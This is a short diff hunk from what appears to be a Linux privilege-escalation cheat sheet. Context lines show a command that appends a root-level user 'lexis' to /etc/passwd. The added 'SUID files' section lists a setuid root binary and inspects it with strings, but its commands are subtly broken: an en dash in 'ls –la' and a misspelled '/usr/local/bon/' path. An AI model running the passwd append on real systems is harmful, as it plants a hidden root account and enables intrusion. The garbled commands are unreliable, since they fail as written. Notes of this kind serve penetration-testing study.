@@ -73,6 +73,12 @@ root::0:0:root:/root:/bin/bash
 ➤  Privesc 02 : Add another root user in /etc/password
 echo "lexis:x:0:0:test:/root:/bin/bash" >> /etc/passwd
 ```
+## SUID files
+```
+ls –la
+-rwsr-xr-x 1 root root 6923 2012-11-02 1:07 /usr/local/bin/uploadtosecure
+strings /usr/local/bon/uploadtosecure
+```
 
 ## Crontab - Privesc
 
